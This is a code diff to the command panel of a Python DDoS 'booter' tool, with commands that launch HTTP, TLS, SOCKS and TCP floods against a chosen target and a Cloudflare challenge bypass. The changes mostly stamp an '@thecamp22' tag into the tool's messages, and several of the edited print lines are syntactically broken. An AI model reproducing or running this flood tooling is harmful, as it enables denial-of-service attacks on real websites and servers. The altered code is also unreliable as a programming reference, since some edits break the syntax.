@@ -554,7 +554,7 @@ def PANEL_USE():
       clear_console()
       CLI_COLOR('main_banner')
       num_panel = True
-    console_prompt = input(f"{fg(115)}ROOT{fg(114)}@{fg(113)}ROOT {fg(112)}$ {attr(0)}")
+    console_prompt = input(f"{fg(115)}Username{fg(114)}@{fg(113)}Password {fg(112)}$ {attr(0)}")
     arg_load = console_prompt.split(" ")
     if arg_load[0] == 'HELP':
       CLI_COLOR('help')
@@ -599,7 +599,7 @@ def PANEL_USE():
                 code_leak = True
             except socket.gaierror:
                 code_leak = False
-                print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
+                print(f"{Fore.YELLOW}FAILED TO GET URL . . [@thecamp22].{Fore.RESET}")
             if code_leak == True:
              threading.Thread(target=RUNING_HTTP,args=(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
             status_code = True
@@ -608,10 +608,10 @@ def PANEL_USE():
             methods_load = 'HTTP'
             CLI_COLOR('atk')
         else:
-             print(f"{fg(136)}! REQUIRE PARAMETER !{attr(0)}")
+             print(f"{fg(136)}! REQUIRE PARAMETER ![@thecamp22]{attr(0)}")
              print(f"{Fore.RED}HTTP <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
-             print(f"{fg(154)}EXAMPLE USE --> HTTP {random.choice(('OWN1','TEST','OWN7','PYF'))} {fg(155)}http://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(0,65535)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.randint(1,9999999)} {fg(223)}{random.randint(1,9999999)} {fg(222)}{random.randint(1,9999999)} {fg(221)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {fg(220)}{random.randint(1,9999999)} {attr(0)}")
-             print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
+             print(f"{fg(154)}EXAMPLE USE [@thecamp22]--> HTTP {random.choice(('OWN1','TEST','OWN7','PYF'))} {fg(155)}http://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(0,65535)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.randint(1,9999999)} {fg(223)}{random.randint(1,9999999)} {fg(222)}{random.randint(1,9999999)} {fg(221)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {fg(220)}{random.randint(1,9999999)} {attr(0)}")
+             print(f"{Fore.CYAN}TYPE_PACKET [@thecamp22]--> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
     elif arg_load[0] == 'HTTPS_TLS.MIX' or arg_load[0] == 'HTPMIX' or arg_load[0] == 'HTMIX':
        if len(arg_load) == 5:
           url = str(arg_load[1]).lower()
@@ -625,8 +625,8 @@ def PANEL_USE():
           methods_load = 'HTTPS_TLS.MIX'
           CLI_COLOR('atk')
        else:
-          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
-          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPMIX','HTTPS_TLS.MIX','HTMIX'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+          print(f"{fg(136)}! REQUIRE PARAMETER ![@thecamp22] {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+          print(f"{fg(154)}EXAMPLE USE [@thecamp22]{random.choice(('HTPMIX','HTTPS_TLS.MIX','HTMIX'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'HTTPS_ALL' or arg_load[0] == 'HTPALL' or arg_load[0] == 'HTALL':
        if len(arg_load) == 6:
           url = str(arg_load[1]).lower()
@@ -644,7 +644,7 @@ def PANEL_USE():
           methods_load = f'HTTPS_ALL.{type_mode}'
           CLI_COLOR('atk')
        else:
-          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {fg(211)}MODE\n{fg(207)}MODE {fg(206)}OF {fg(205)}HTTPS_ALL {fg(204)}HERE {fg(202)}- {fg(70)}0 {fg(71)}IT {fg(72)}DEFAULT {fg(73)}MODE {fg(214)}( {fg(196)}OLD HTTPS_ALL {fg(214)}) {fg(45)}1{fg(44)} IT {fg(43)}NEW {fg(42)}MODE {fg(214)}( {fg(196)}NEW HTTPS_ALL {fg(214)})\n\n{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {random.choice(('0','1'))} {attr(0)}")
+          print(f"{fg(136)}! REQUIRE PARAMETER ![@thecamp22] {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {fg(211)}MODE\n{fg(207)}MODE {fg(206)}OF {fg(205)}HTTPS_ALL {fg(204)}HERE {fg(202)}- {fg(70)}0 {fg(71)}IT {fg(72)}DEFAULT {fg(73)}MODE {fg(214)}( {fg(196)}OLD HTTPS_ALL {fg(214)}) {fg(45)}1{fg(44)} IT {fg(43)}NEW {fg(42)}MODE {fg(214)}( {fg(196)}NEW HTTPS_ALL {fg(214)})\n\n{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {random.choice(('0','1'))} {attr(0)}")
     elif arg_load[0] == 'CF_UAM':
        if len(arg_load) == 5:
           target = arg_load[1]
@@ -653,9 +653,9 @@ def PANEL_USE():
           type_mode = str(arg_load[4])
           r = requests.get(target)
           if '<title>Just a moment...</title>' in r.text:
-            print("TRYING BYPASS")
+            print("TRYING BYPASS"[@thecamp22])
             if get_cookie(target) == True:
-              print("! BYPASS !")
+              print("! BYPASS !"[@thecamp22])
               target = get_target(target)
               threading.Thread(target=CF_UAM_RUNNING(time_booter, target, type_mode,cookie,useragent,thread_loader)).start()
               target_load = target['host']
@@ -663,7 +663,7 @@ def PANEL_USE():
               methods_load = f'CF-UAM'
               CLI_COLOR('atk')
        else:
-        print("CF_UAM <TARGET> <THREAD> <TIME> <METHODS>") 
+        print([@thecamp22]"CF_UAM <TARGET> <THREAD> <TIME> <METHODS>") 
     elif arg_load[0] == 'HTPTC' or arg_load[0] == 'HTPC' or arg_load[0] == 'HTTPS_TLS.CIPHER':
        if len(arg_load) == 5:
           url = str(arg_load[1]).lower()
@@ -677,8 +677,8 @@ def PANEL_USE():
           methods_load = 'HTTPS_TLS.CIPHER'
           CLI_COLOR('atk')
        else:
-          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
-          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPC','HTTPS_TLS.CIPHER','HTPTC'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+          print(f"{fg(136)}! REQUIRE PARAMETER ! [@thecamp22]{fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+          print(f"{fg(154)}EXAMPLE USE [@thecamp22]{random.choice(('HTPC','HTTPS_TLS.CIPHER','HTPTC'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'HTPSRE' or arg_load[0] == 'HTTPS_RECREATE':
         if len(arg_load) == 5:
             url = str(arg_load[1]).lower()
@@ -692,8 +692,8 @@ def PANEL_USE():
             methods_load = 'HTTPS_RECREATE'
             CLI_COLOR('atk')
         else:
-            print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
-            print(f"{fg(154)}EXAMPLE USE {random.choice(('HTTPS_RECREATE','HTPSRE'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+            print(f"{fg(136)}! REQUIRE PARAMETER ![@thecamp22] {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+            print(f"{fg(154)}EXAMPLE USE [@thecamp22]{random.choice(('HTTPS_RECREATE','HTPSRE'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'SOCKS_CFLOW' or arg_load[0] == 'SCFL':
         if len(arg_load) == 5:
             url = str(arg_load[1]).lower()
@@ -707,8 +707,8 @@ def PANEL_USE():
             methods_load = 'SOCKS_CFLOW'
             CLI_COLOR('atk')
         else:
-            print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
-            print(f"{fg(154)}EXAMPLE USE {random.choice(('SOCKS_CFLOW','SCFL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+            print(f"{fg(136)}! REQUIRE PARAMETER ![@thecamp22] {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+            print(f"{fg(154)}EXAMPLE USE [@thecamp22]{random.choice(('SOCKS_CFLOW','SCFL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'TCP':
         if len(arg_load) ==7:
            ip = str(arg_load[1])
@@ -865,9 +865,9 @@ def PANEL_USE():
            except:
                status_code_tcp = False
            if status_code_tcp == True:
-               print(f"{Fore.GREEN}CONNECTION=OK {Fore.LIGHTGREEN_EX}DATA_RECV={d.decode()}{Fore.RESET}")
+               print(f"{Fore.GREEN}CONNECTION=OK [@thecamp22]{Fore.LIGHTGREEN_EX}DATA_RECV={d.decode()}{Fore.RESET}")
            else:
-               print(f"{Fore.RED}CONNECTION=NO {Fore.LIGHTRED_EX}DATA_RECV=NULL{Fore.RESET}")
+               print(f"{Fore.RED}CONNECTION=NO [@thecamp22]{Fore.LIGHTRED_EX}DATA_RECV=NULL{Fore.RESET}")
     else:
        print(f"{fg(196)}{console_prompt} NOT FOUND COMMAND ! {attr(0)}")
     PANEL_USE()
@@ -897,6 +897,6 @@ def checker_login():
         checker_login()
     else:
      FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f"[failed] {GET_TIME()} - CAN'T LOGIN \n")
-     print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . .{Fore.RESET}")
+     print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . [@thecamp22].{Fore.RESET}")
      time.sleep(1)
      checker_login()
